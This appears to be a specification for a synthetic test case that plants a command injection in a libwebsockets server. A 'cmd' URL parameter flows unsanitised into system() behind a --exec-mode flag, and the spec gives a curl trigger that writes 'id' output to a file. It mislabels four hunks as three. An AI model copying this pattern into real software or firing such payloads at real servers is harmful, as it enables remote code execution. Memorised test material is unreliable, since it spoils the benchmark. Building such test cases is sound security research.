DESCRIPTION:
  CLI-flag-gated command injection in a libwebsockets HTTP server. The server
  must be started with --exec-mode for the vulnerable /exec endpoint to be
  reachable. A user-supplied URL query parameter (cmd=) flows directly into
  system() with no sanitization.

CONFIG_GATE (C1 — simple):
  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode.
  check:      `if (exec_mode && strncmp(in, "/exec", 5) == 0 ...)`
              single boolean guard two lines above the system() call.
  complexity: one condition, one flag, no struct, no file parsing

INPUT_FLOW (I1 — direct):
  entry:      HTTP GET /exec?cmd=<payload>  →  lws_get_urlarg_by_name_safe()
  path:       handle_exec() extracts "cmd" URL arg into char cmd[256]
              the URL-decoded string is passed directly to system()
  transforms: URL arg decode by lws only — no snprintf(), no struct copy

SANITIZATION (S1 — none):
  none

SINK:        system() inside handle_exec() in server.c

CHANGED FILES:
  server.c — 3 hunks:
    1. global:            added `exec_mode` global int
    2. handle_exec():     new function — lws_get_urlarg_by_name_safe()
                          then direct system(cmd)
    3. callback_http():   C1 gate — exec_mode + /exec URL prefix check
    4. main():            --exec-mode flag parsing sets exec_mode = 1

EXPLOIT:
  build:   bash build.sh
  start:   ./lws_server --port 18109 --wwwroot /tmp/www --exec-mode
  trigger: curl 'http://127.0.0.1:18109/exec?cmd=id>/tmp/pwned'
  verify:  cat /tmp/pwned
  expect:  uid=... line written by the server process

  gate bypass: omitting --exec-mode causes /exec to fall through to the
               file-serving mount and return 404.

NOTES:
  - system() output goes to the server's stderr (inherited fd), not the
    HTTP response body. Use a write-to-file payload to confirm blind execution.
  - lws_get_urlarg_by_name_safe() URL-decodes the argument, so any
    shell-significant character works directly.
